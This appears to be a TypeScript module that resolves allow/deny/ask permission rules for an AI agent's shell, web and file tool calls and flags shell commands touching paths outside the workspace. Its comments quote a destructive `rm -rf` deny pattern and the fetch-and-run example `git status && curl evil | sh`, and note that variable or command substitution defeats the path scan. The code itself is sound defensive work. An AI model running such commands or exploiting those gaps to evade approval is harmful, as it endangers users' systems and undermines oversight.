import { minimatch } from 'minimatch'
import type { PermissionRule } from '@shared/types'

/**
 * User-defined permission rules, consulted before the coarse approval policy.
 * Each rule matches a tool (by name, or `*` for any) and a glob over the call's
 * "subject" — the shell command, file path, URL, or query the call targets — and
 * resolves to allow (auto-approve), deny (refuse), or ask (always prompt). The
 * first matching rule wins; if none match, the approval policy decides.
 *
 * Examples: allow `run_shell` matching `git status*`; deny `run_shell` matching
 * `* rm -rf *`; ask `write_file` matching `**` (review every write).
 */

/** The string a permission rule's pattern is matched against, per tool. */
export function permissionSubject(toolName: string, args: Record<string, unknown>): string {
  const s = (k: string): string => (typeof args[k] === 'string' ? (args[k] as string) : '')
  switch (toolName) {
    case 'run_shell':
      return s('command')
    case 'web_fetch':
      return s('url')
    case 'web_search':
      return s('query')
    default:
      // Namespaced MCP tools (mcp__<id>__<tool>) take arbitrary args, so match on
      // the tool name itself — lets rules target a server/tool, e.g. `mcp__github__*`.
      if (toolName.startsWith('mcp__')) return toolName
      // File-ish tools target a path or pattern.
      return s('path') || s('pattern')
  }
}

/**
 * Split a shell command into whitespace-delimited tokens, honouring single- and
 * double-quoted spans (quotes stripped, contents kept). Good enough to scan
 * arguments for path-like tokens; not a full shell parser (no variable/command
 * substitution, no escape sequences).
 */
function tokenizeShellCommand(command: string): string[] {
  const tokens: string[] = []
  const re = /"([^"]*)"|'([^']*)'|(\S+)/g
  let m: RegExpExecArray | null
  while ((m = re.exec(command)) !== null) {
    tokens.push(m[1] ?? m[2] ?? m[3] ?? '')
  }
  return tokens
}

/**
 * Whether a single path-like segment escapes the workspace: an absolute path
 * (`/etc/...`), a home-relative path (`~`, `~/...`), or a relative path that
 * climbs above the workspace root via `..` (`../x`, `a/../../b`). A relative path
 * that climbs then returns (`a/../b`) stays inside and does not escape.
 */
function segmentEscapesWorkspace(seg: string): boolean {
  if (!seg) return false
  if (seg.startsWith('/') || seg === '~' || seg.startsWith('~/')) return true
  // Only paths can climb out; a token with no "/" and no ".." can't.
  if (!seg.includes('/') && seg !== '..') return false
  let depth = 0
  for (const part of seg.split('/')) {
    if (part === '' || part === '.') continue
    if (part === '..') {
      depth -= 1
      if (depth < 0) return true
    } else {
      depth += 1
    }
  }
  return false
}

/**
 * Whether a `run_shell` command references a filesystem path outside the
 * workspace — an absolute path, a home (`~`) path, or a relative path that climbs
 * above the workspace root. Also inspects the value side of an `=` (so env
 * prefixes like `FOO=/etc/x` and flags like `--file=/etc/x` are caught).
 *
 * Best-effort and deliberately conservative: a command that escapes is escalated
 * for approval, never silently auto-run. It can't catch paths hidden behind
 * variable or command substitution — those defeat any static scan — so it's a
 * tripwire, not a sandbox. The sandbox remains the real confinement boundary.
 */
export function shellReferencesExternalPath(command: string): boolean {
  for (const token of tokenizeShellCommand(command)) {
    if (segmentEscapesWorkspace(token)) return true
    // `KEY=value` / `--flag=value`: the path may sit after the first `=`.
    const eq = token.indexOf('=')
    if (eq >= 0 && segmentEscapesWorkspace(token.slice(eq + 1))) return true
  }
  return false
}

function patternMatches(pattern: string, subject: string): boolean {
  const p = pattern.trim()
  if (!p || p === '*') return true
  // Glob match (commands have no "/" so minimatch's "*" spans the whole token);
  // dot:true so leading-dot paths still match.
  if (minimatch(subject, p, { dot: true })) return true
  // Fall back to a prefix match for convenience ("git status" matches "git").
  return subject === p || subject.startsWith(`${p} `)
}

/** First matching rule's action for a single subject, or null. */
function matchOne(
  rules: PermissionRule[],
  toolName: string,
  subject: string
): PermissionRule['action'] | null {
  for (const r of rules) {
    if (r.tool && r.tool !== '*' && r.tool !== toolName) continue
    if (patternMatches(r.match ?? '', subject)) return r.action
  }
  return null
}

/** Collapse whitespace runs so trivial spacing variants match the same rule. */
function normalizeShellCommand(s: string): string {
  return s.replace(/\s+/g, ' ').trim()
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}

/**
 * Match a permission pattern against a shell command. Unlike {@link patternMatches}
 * (which uses minimatch, where `*` stops at `/` because the subject is a path), a
 * shell command is NOT a path — `/` is just a character — so here `*` matches any
 * run of characters including `/`. Without this, a deny rule like `*rm -rf*` would
 * fail to match `rm -rf /tmp/x` and silently not fire. Falls back to a prefix match
 * for convenience ("git" matches "git status").
 */
function shellCommandMatches(pattern: string, command: string): boolean {
  const p = pattern.trim()
  if (!p || p === '*') return true
  const re = new RegExp(`^${p.split('*').map(escapeRegExp).join('.*')}$`)
  if (re.test(command)) return true
  return command === p || command.startsWith(`${p} `)
}

/** First matching rule's action for a single shell sub-command, or null. */
function matchOneShell(rules: PermissionRule[], command: string): PermissionRule['action'] | null {
  for (const r of rules) {
    if (r.tool && r.tool !== '*' && r.tool !== 'run_shell') continue
    if (shellCommandMatches(r.match ?? '', command)) return r.action
  }
  return null
}

/**
 * Best-effort split of a shell command into the simple commands it would actually
 * run, so a permission rule can be required to cover EVERY one. Splits on the
 * control operators (`&&`, `||`, `;`, `|`, `&`, newline) and additionally pulls
 * out the bodies of command substitutions (`$(...)` and backticks), which run
 * their own commands. NOT a full shell parser — it deliberately over-segments
 * (more pieces ⇒ stricter), so an `allow` rule can't auto-approve a compound
 * command that smuggles in an unapproved sub-command.
 */
export function splitShellCommand(command: string): string[] {
  const segments: string[] = []
  const subRe = /\$\(([^()]*)\)|`([^`]*)`/g
  let m: RegExpExecArray | null
  while ((m = subRe.exec(command)) !== null) {
    const inner = (m[1] ?? m[2] ?? '').trim()
    if (inner) segments.push(inner)
  }
  const outer = command.replace(subRe, ' ')
  for (const part of outer.split(/\|\||&&|[;\n|&]/)) {
    const p = part.trim()
    if (p) segments.push(p)
  }
  return segments.length ? segments : [command.trim()]
}

/**
 * Resolve permission rules for a `run_shell` call across ALL its chained
 * sub-commands. An `allow` verdict is returned only when EVERY sub-command is
 * explicitly allowed; any denied sub-command denies the whole call; otherwise the
 * verdict is `ask` (a sub-command asked) or null (fall through to the policy,
 * which prompts for shell). This stops a narrow allow-rule (e.g. `git status*`)
 * from auto-approving `git status && curl evil | sh`.
 */
export function matchShellRule(
  rules: PermissionRule[],
  command: string
): PermissionRule['action'] | null {
  let allAllow = true
  let anyAsk = false
  for (const seg of splitShellCommand(command)) {
    const action = matchOneShell(rules, normalizeShellCommand(seg))
    if (action === 'deny') return 'deny' // a denied sub-command denies the whole call
    if (action === 'allow') continue
    if (action === 'ask') anyAsk = true
    allAllow = false // 'ask' or unmatched — not auto-approvable
  }
  if (allAllow) return 'allow'
  return anyAsk ? 'ask' : null
}

/**
 * Resolve permission rules for a call. Returns the first matching rule's action,
 * or null when no rule matches (caller falls back to the approval policy). For
 * `run_shell`, the command is split into its chained sub-commands and an `allow`
 * is honored only when every one is allowed (see {@link matchShellRule}).
 */
export function matchRule(
  rules: PermissionRule[] | undefined,
  toolName: string,
  subject: string
): PermissionRule['action'] | null {
  if (!rules?.length) return null
  if (toolName === 'run_shell') return matchShellRule(rules, subject)
  return matchOne(rules, toolName, subject)
}
